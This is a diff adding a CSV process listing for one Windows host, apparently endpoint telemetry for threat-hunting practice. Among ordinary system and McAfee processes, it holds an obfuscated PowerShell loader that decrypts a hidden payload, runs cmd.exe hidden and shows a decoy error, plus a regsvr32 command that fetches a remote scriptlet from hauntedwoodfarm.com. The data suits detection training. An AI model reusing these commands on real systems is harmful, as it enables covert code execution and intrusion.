@@ -1,0 +1,61 @@
+hostname,name,arguments,username,path,pid
+EC481JYR,services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,5436
+EC481JYR,lsass.exe,C:\Windows\system32\lsass.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,4320
+EC481JYR,mcshield.exe,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",milathom58,C:\Program Files\Common Files\McAfee\AMCore,5842
+EC481JYR,mchost.exe,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",milathom58,C:\Program Files\Common Files\McAfee\Platform\Core,653
+EC481JYR,McDiReg.exe,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,milathom58,C:\ProgramData\McAfee\Direct,4618
+EC481JYR,mcafee_trial_setup_433.0207.3919_key.exe,"""C:\Users\milathom58\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",milathom58,C:\Users\milathom58\AppData\Local\Temp\scoped_dir9616_4071,398
+EC481JYR,ProtectedModuleHost.exe,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",milathom58,C:\Program Files\Common Files\McAfee\ModuleCore,3762
+EC481JYR,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -service",rob.col41,C:\Program Files\TightVNC,3992
+EC481JYR,TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,NT AUTHORITY\SYSTEM,C:\Windows\servicing,5596
+EC481JYR,modulecoreservice.exe,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",milathom58,c:\program files\common files\mcafee\modulecore,2359
+EC481JYR,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,1812
+EC481JYR,McPvTray.exe,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",milathom58,C:\Program Files\McAfee\MAT,5389
+EC481JYR,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,milathom58,C:\ProgramData\McAfee\McInstruTrack,4854
+EC481JYR,ServiceHost.exe,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",milathom58,C:\Program Files\McAfee\WebAdvisor,989
+EC481JYR,OneDrive.exe,"""C:\Users\milathom58\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",milathom58,C:\Users\milathom58\AppData\Local\Microsoft\OneDrive,6493
+EC481JYR,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkService,NT AUTHORITY\SYSTEM,C:\Windows\system32,5716
+EC481JYR,ModuleCoreService.exe,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,milathom58,c:\program files\common files\mcafee\modulecore,6473
+EC481JYR,VBoxService.exe,C:\Windows\System32\VBoxService.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,6156
+EC481JYR,conhost.exe,\??\C:\Windows\system32\conhost.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,1200
+EC481JYR,svchost.exe,C:\Windows\System32\svchost.exe -k secsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,2084
+EC481JYR,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,224
+EC481JYR,McCSPServiceHost.exe,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",milathom58,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,4363
+EC481JYR,CCleaner64.exe,"""C:\Program Files\CCleaner\CCleaner.exe"" /MONITOR /uac",rob.col41,C:\Program Files\CCleaner,3385
+EC481JYR,UIHost.exe,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",milathom58,C:\Program Files\McAfee\WebAdvisor,2013
+EC481JYR,mcuicnt.exe,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",milathom58,C:\Program Files\Common Files\mcafee\Platform,483
+EC481JYR,csrss.exe,%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024 20480 768 Windows=On SubSystemType=Windows ServerDll=basesrv 1 ServerDll=winsrv:UserServerDllInitialization 3 ServerDll=winsrv:ConServerDllInitialization 2 ServerDll=sxssrv 4 ProfileControl=Off MaxRequestThreads=16,NT AUTHORITY\SYSTEM,C:\Windows\system32,1196
+EC481JYR,MicrosoftEdgeCP.exe,"""C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe"" -ServerName:ContentProcess.AppX6z3cwk4fvgady6zya12j1cw28d228a7k.mca",milathom58,C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe,3640
+EC481JYR,smss.exe,\SystemRoot\System32\smss.exe,NT AUTHORITY\SYSTEM,\SystemRoot\System32,4308
+EC481JYR,lsm.exe,C:\Windows\system32\lsm.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,2728
+EC481JYR,Explorer.EXE,C:\Windows\Explorer.EXE,NT AUTHORITY\SYSTEM,C:\Windows,4088
+EC481JYR,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,C:\Windows\system32,4844
+EC481JYR,svchost.exe,C:\Windows\system32\svchost.exe -k LocalService,NT AUTHORITY\SYSTEM,C:\Windows\system32,6040
+EC481JYR,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"C:\Ruby24-x64\bin\irb.cmd"" """,rob.col41,C:\WINDOWS\system32,991
+EC481JYR,SearchProtocolHost.exe,"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe15_ Global\UsGthrCtrlFltPipeMssGthrPipe15 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",NT AUTHORITY\SYSTEM,C:\Windows\system32,3616
+EC481JYR,CCleaner64.exe,"""C:\Program Files\CCleaner\CCleaner.exe"" /uac",rob.col41,C:\Program Files\CCleaner,2955
+EC481JYR,vncviewer.exe,"""C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe"" ",rob.col41,C:\Program Files\RealVNC\VNC Viewer,2028
+EC481JYR,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,NT AUTHORITY\SYSTEM,C:\Windows\system32,756
+EC481JYR,spoolsv.exe,C:\Windows\System32\spoolsv.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,1540
+EC481JYR,powershell.exe,"$key = (5,3,71,2,22,67,31,121,5,5,14,17,21,82,19,13,1,34,1,7,6,1,15,13);$Secure =""76492d1116743f0423413b16050a5345MgB8AHQAYwBiAEYAWgBoAFoASwB6AGUALwB5AEIAQQAvAEoANgBpAFMAUABZAHcAPQA9AHwAOQA2AGIANAA0ADcAZgA4ADEAYwA0AGYAYQA3AGYAOAA2AGEAMgA0AGUAZAAxAGYAMwAyAGEANQBjAGUANQAyADUANwBhAGYAZgBiADUANQAyAGUAMAA1ADQAOAAyADMAZQAwAGYAYwA0ADQANwBiADQAYQAwAGMAZQAwAGUAZABhADYANgBkADAAOAA4AGQAZgA4AGYAYwBlAGUAZQAxADcAMgA2ADIAMABmADMANgBlADUAMQAzAGIAZgBjAGYANwBhAGEAMgA1ADUAYwAzADIANgBiADUAZgBjAGEAZgA1AGEAZgAxADQANABlADQAZQBlAGYAOQA5ADMAZQA1ADMAZABiAGIANQAzADgANQA0ADAAMwBmAGMAOQA1ADAANQBmADAAZAAzADAAYQA0ADYAYgBjAGQANgA5ADIAMABiADYAMQAzADYAYgAzAGMANQA2ADYAMQBlAGUANwAwAGEAOQA0ADUAMQBlAGUAMAA5AGQANQBkADYANAAzAGQAOAA4ADIAZQA4ADAAZQAzADkANgBhADEAMAA2AGQAYQA4ADMAYwA1ADUANgBkADEAMwAxADEAZAA3ADEAMgA3ADIAYQBlADIAYgAxAGQAZABmADkAMAA4ADYAYQA1ADQANQA3ADQAMQBjAGUAMgBhADYAZgA4ADEANABjADQANAAwAGEAMABhAGQANQBkADYAZAA3ADMANgAzADAAZgBmADUANgBjAGEAMAA1ADEAMwBiADQAZQBmADgAZgBiADIAMAAwAGIANAA3AGUAZgAzADAAMwBiADUANAA2ADcAMgBlADMANQA4ADAANwA2ADMAZgAwADEANAA4AGEAYgAxAGQAOAA4AGIAYgA1ADEAYQA4ADgAMQBhADYAZAAzADIAZgBmAGEAMABmAGUANQBmAGEAMgAwADcAMwA1AGUAZgAzADIAYgAyADYAMABhADEAYwA1ADQAMwAzADAANAA0AGUANgA2ADYANABkADYAZgA0AGQAYQAwADUAMQA5AGMAYwBlAGEAYQA5ADAAYQA3ADMANABkAGYAZQBkADYANwBhAGQANwAwADEAMAA0ADIAYwBlADIAMQA4ADEAZgAzAGUAYwAzADIANwA0ADAAZgBjADIAOAA2ADgAMAA4AGIAZABjADUANQAzAGIAMwBiADcAYwA0AGYAMABlADUAYQBhAGMANgBjADQANwA2ADUANAAyADcAMwBkADcAOAA2AGIANQBhADcAZgBiADMAMgA5ADkAMABiAGUAMgAxAGMAMgAwADAAYgBjAGIANgBlADkANwAwADcAOAA5ADMAZAAzADUAZAAxADUAYQA2AGYAOQA2ADcANwAxADYAYgA4ADgAYQA3ADQAMwAzADUAMQBlADUAYwA2AGUAMAAwADMAYgA2ADYAMwBkADMANwBkADkAOQAwADAANQAzAGEAZQBjADEANwBlAGYAMwBmADAAZQBkAGMANAAwAGUAZQAyAGYAOQA0AGYAZgBhAGEAMwBmADYAMAA4AGEAMQAzAGYAMgAwADYAMgA2ADgANAA2ADgAOABhADIANABiAGQANAAwAGYAYgAyADMAYwA1ADYAZQA2ADMAOQAxAGYANQBiAGQAZgA2ADQAMwAzAGUAYgA2ADkAYgA1AGIAMwAwAGQAZgBmADMAZgAyAGIANwBhADUANgBlADEANQAxAGQAOQBjADQAZgBkADEANwAxAGIAMgAyAGYAMgBmAGYAMAAyADcAYwBjADYAZABlADYAZQA3AGIANAA2ADYAYQA4ADYAZQBlADYAYgA0ADMAOQAzADIAOAA2ADYAMAAxADMAZQAzADYANQAwADAANgA0ADMAYQBiAGUANABhADQAMQA2AGUAOQA4ADUAYgA0ADcAMABlAGQAYwAwAGUAMAA4ADAAOABhADEANgA1ADEAZgA5ADEAZgA2ADUAMABmAGYAMAA1ADIAYwBhADMAYwA3ADgAZQBlAGMAYgBiADkAMgAyADIAMgA5ADMANABmADAAYgA5AGQAZABjAGUAMAA3ADkAMwAyADAAYgA5ADMAYwA0ADcAOQA3ADgANgA1ADQAMQA3AGYAOQA4ADgAZgBiADkAYgA5AGMAMwA1AGYAYQBkADIAYwBlAGIAYQAyADcAYwAzADEAOQA2ADUANgA2ADYANQAyADcAZAA0ADUAZgBlADgANgBiADkAOQA3ADYAYQA0AGQANAAxADkAYgBmADUAMwA1ADIANQBlAGQAYwA4ADEAYwA3ADkAOAA0AGUAMABiADYAOAAxADMANwA4AGMAZAAwADIAYwBiADEANABkADYANwA2ADYANAAwAGYAYwA0ADQANQBmADMAMQAxADUANQA2AGQAMwA3AGEAZQBkADEAMQAxADEAZgA4ADgAYgA4ADMANQAwAGUAZgBlAGUAMAAwADkAMwBlAGMAMQBlADAAMgBhADEANABmADgAYQBmADgANAAwAGUANwA1ADgAMABjADgANgBjADEAOQA0AGUANgA4AGQANQA4AGIAYQBkADEANwBhADcAYgA5AGYAMgA2ADkAZgBiAGUAZgA5AGMAOABkAGEAMgBlAGQAMgAyADgANgBiADAANgBmAGQAYgBkAGEANwAwADAAZgBjADEANQA1ADQAMgA4ADcAYwA2AGIAZAA5ADQAZAA2AGMAYwA2ADYAYQA0ADAAYQAyADcAOQAxAGYAMQAyADcANwBiADEAMgBhAGUAMwA3AGYAZQBiAGMAMgAzAGEANQBkADcANAAwADgAOQA4ADUAMABjADcAYwBhADEAYQAyADIA"";$Encrypted= ConvertTo-SecureString $Secure -key $key;$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Encrypted);$ldf = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) -replace ""_TMP_"",$env:tmp;$dm0 = ""cmd.exe"";$ldf; start-process -wiNdowStylE HiDden $dm0 $ldf;$of = nEw-obJEct -coMOBJecT wScRiPt.sheLl;$7hi = $of.popUp(""Error reading file, contents are corrupted"",0,""Error"",5);",NT AUTHORITY\SYSTEM,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1336
+EC481JYR,McAMTaskAgent.exe,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",milathom58,C:\Program Files\Common Files\McAfee\TaskScheduler,5566
+EC481JYR,SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,NT AUTHORITY\SYSTEM,C:\Windows\system32,28
+EC481JYR,McDiReg.exe,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",milathom58,C:\ProgramData\McAfee\Direct,2679
+EC481JYR,svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch,NT AUTHORITY\SYSTEM,C:\Windows\system32,4192
+EC481JYR,wininit.exe,wininit.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,3960
+EC481JYR,MMSSHOST.EXE,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",milathom58,C:\Program Files\Common Files\McAfee\MMSSHost,1521
+EC481JYR,MFEAvSvc.exe,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",milathom58,C:\Program Files\McAfee\MfeAV,451
+EC481JYR,svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,4760
+EC481JYR,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,NT AUTHORITY\SYSTEM,C:\Windows\system32,1044
+EC481JYR,McApExe.exe,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",milathom58,C:\Program Files\Common Files\McAfee\VSCore_18_6,1415
+EC481JYR,wmpnetwk.exe,"""C:\Program Files\Windows Media Player\wmpnetwk.exe""",NT AUTHORITY\SYSTEM,C:\Program Files\Windows Media Player,316
+EC481JYR,svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS,NT AUTHORITY\SYSTEM,C:\Windows\system32,5244
+EC481JYR,ruby.exe,"""C:\Ruby24-x64\bin\ruby.exe"" ",rob.col41,C:\Ruby24-x64\bin,1322
+EC481JYR,taskhost.exe,"""taskhost.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,620
+EC481JYR,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServicePeerNet,NT AUTHORITY\SYSTEM,C:\Windows\System32,4216
+EC481JYR,PEFService.exe,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",milathom58,C:\Program Files\Common Files\McAfee\PEF\CORE,6208
+EC481JYR,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -controlservice -slave",rob.col41,C:\Program Files\TightVNC,3603
+EC481JYR,regsvr32.exe,C:\Windows\System32\regsvr32 /u /n /s /i:\\hauntedwoodfarm.com\ApplySettingsTemplateCatalogT.sct scrobj.dll,erimitch,C:\Windows\System32\regsvr32.exe,4728
+EC481JYR,sppsvc.exe,C:\Windows\system32\sppsvc.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,4416
+EC481JYR,Dwm.exe,"""C:\Windows\system32\Dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,2608
+EC481JYR,wuauclt.exe,"""C:\Windows\system32\wuauclt.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,5284
